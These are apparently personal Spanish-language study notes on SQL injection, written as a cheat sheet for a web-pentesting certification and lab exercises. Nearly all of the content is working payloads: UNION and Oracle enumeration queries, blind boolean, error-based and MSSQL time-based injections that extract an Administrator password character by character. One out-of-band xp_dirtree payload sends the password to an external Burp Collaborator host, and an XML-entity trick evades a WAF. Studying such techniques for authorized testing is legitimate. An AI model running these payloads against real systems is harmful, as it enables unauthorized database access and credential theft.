POR FAVOR si es un número NO le pongas comilla coño

ORDERBY-> si hace:

```
SELECT * FROM CACA ORDER BY id "input"
```

como el order by tiene id ta puesto tendremos que hacer la inyeccion con coma: oder-by=ASC, SELECT ...

si lo hace así : 

```
SELECT * FROM CACA ORDER BY "input"
```

como no hay ninguna variable se hace asi : order-by=SELECT ...
## UNION

(Mirar apuntes del CBBH ) 

ORACLE:

Ojo con oracle si la consulta tiene 3 columnas no te vale con usar `'UNION SELECT NULL,NULL,NULL -- -` porque en Oracle todo `SELECT` query tiene que ir con un `FROM` por suerte hay una tabla bult-in de orace llamada `DUAL` por ende el payload sería:

```
'UNION SELECT NULL,NULL,NULL FROM DUAL -- -
```
Si solo hay una columna que podamos ver entonces podemos hacer que en esa misma columna se enseñen mas de un dato concatentando datos de esta forma (en Oracle, en otras db hay otras formas):

`' UNION SELECT username || '~' || password FROM users--`
Enumeración de oracle:

`'+UNION+SELECT+table_name,NULL+FROM+all_tables--`
`'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--`

## Blind SQLi

Pa cuando se puede hacer SQLi pero no ves una mierda en la respuesta

### Exploiting blind SQL injection by triggering conditional responses

Parametro en la request 

`Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4`

la web para comprobar que la cookie es válida hace : 

`SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`

Esta query es vulnerable a SQLi pero no te devuelve el resultado de la query si no que si el `TrackingId` es correcto te pone Welcome back y con ese mensajito ya podemos empezar a explotar una blind SQLi porque ahora sabemos cuando la query devuelve true:

```
…xyz' AND '1'='1 -> true (wellcome back)
…xyz' AND '1'='2 -> false (nada)
```

ahora supongamos que hay una tabla `USER` y dos columnas `Username` y `Password`
además sabemos que hay un usuario llamado Administrator, entonces para saber su contraseña haríamos :

```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```

esto nos devolverá si el primer carácter de la contraseña es mayor a `m` , en este caso nos devuelve Wellvome back por ende si que lo es, ahora probamos:

```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
```

Esto no nos devuelve nada por ende el primer carácter es menor que `t`, después de varios intentos hacemos :
```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```

que nos devuelve true por ende la primera letra de la contraseña es `s`

```
Nota:
En algunas dbs la función SUBSTRING se usa como SUBSTR
```

OTROS QUERYS IMPORTANTES

1. Para saber su la tabla users existe :
```
xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
```

esto selecciona la letra `a` de la tabla user , lo limita a la primera respuesta, sea esta la `a` y luego compara si el resultado es igual a `a` ,esto será true cuando la tabla exista

2. Para ver si el usuario Administrator existe :
```
xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```

3. la length de la password
```
xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
```

### Error-based SQL injection

#### conditional errors
Cuando los mensajes de error nos dan cierta información, también aplicado a casos de blind SQLi.

Se puede aprovechar esto para que en situaciones de blind SQLi que no nos devuelve nada cuando la query sea verdadera salte un error, ejemplo:

```
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a 

xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

cuando lo de dentro del WHEN es true entonces se ejecuta el THEN cuando es false entonces se ejecuta el ELSE

En la primera inyección se ejecutará el ELSE puesto que 1 no es igual a 2, entonces en la respuesta no saldra nada
`OM Users)=`
En la segunda inyección se ejecutará el THEN dando como resultado un erro puesto que no se puede dividir 1 entre 0

Aplicado a un caso más practico:

```
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

Esta query devolverá error si la primera letra de la contraseña de Administrator es mayora a `m`

#### verbose SQL error messages

ejemplo de un error con mucho texto : 
```
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
```

nuestro objetivo es que el error nos muestre el output de la SQLi para convertir una blind SQLi en una normal para esto usaremos la función `CAST()`

ejemplo: 

```
CAST((SELECT example_column FROM example_table) AS int)
```

este `CAST` lo que hace es convertir el output de la query a int, partiendo de la base de que el output de la tabla del ejemplo contiene datos string, por ende nuestra inyección lanzará el siguiente error : 

`ERROR: invalid input syntax for type integer: "Example data"`

tambien puedes hacer query baásica por si lo demás no funciona para ver si te da mas info : 


`' AND CAST((SELECT 1) AS int)--`

### Time based


Siempre se da por hecho:

tabla : users
columnas: username , password


La idea es hacer una query y ver una diferencia en el tiempo de respuesta de cuando es true y cuando es false

La sintaxis para hacerlo posible depende de la base de datos usada en este caso estamos ante una Microsoft SQL Server por ende este será nuestro payload:

```
'; IF (1=2) WAITFOR DELAY '0:0:10'-- 
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

la primera query no esperara 10 segundos peusto que 1 no es igual a 2, en cambio la segunda hará que la respuesta vuelva en 10 segundos como mínimo.

este payload aplicado a algo práctico podría ser : 

```
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```

```
Nota:
en SQL el ; se usa para separar sentencias y lo usamos en las time-based peusto que no usamos operadores como AND para seguir con la consulta anterior
```

### blind SQL injection using out-of-band (OAST) techniques

Cuando todo lo anterior falla probamos con esta técnica que viene haciendo una inyección SQL que hace una petición a nuestro servidor por ende podremos ver si la inyección es efectiva si hace una petición a nuestro servidor de burp, la sintaxis varía para cada tipo de db, en el caso de Microsfot SQL server  el payload sería : 

```
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```

si esto funciona nuestro siguiente movimiento es pillar las credenciales del usuario administrador : 

```
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```

esto lo que hace es leer la contraseña del admin con : `SELECT password FROM users WHERE username='Administrator'` y lo guarda en la variable `@p` para luego hacer una petición a mi servidor donde podremos ver como resultado : `[contraseña].cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a`

### SQL injection in different contexts

tambien se pueden ejecutar en APIS que envian la info en XML por ejemplo donde para bypassear un waf podríamos encodear la S de SELECT en xml para que se vea así:

```
<stockCheck> <productId>123</productId> <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId> </stockCheck>
```

```
nota:
&#x53; es la letra S encodeado en HTML
```

## Enumeración


#### Mysql/Postgre

Database:

```
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```

Tablas:

```
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = 'clientes_db';
```

Columnas

```
SELECT COLUMN_NAME
FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'usuarios' AND TABLE_SCHEMA = 'clientes_db';
```

#### PARA ORACLE:

tablas

```
'+UNION+SELECT+table_name,NULL+FROM+all_tables--
```

columnas : 

````
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
````


contenido de las tablas :

```
'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
```
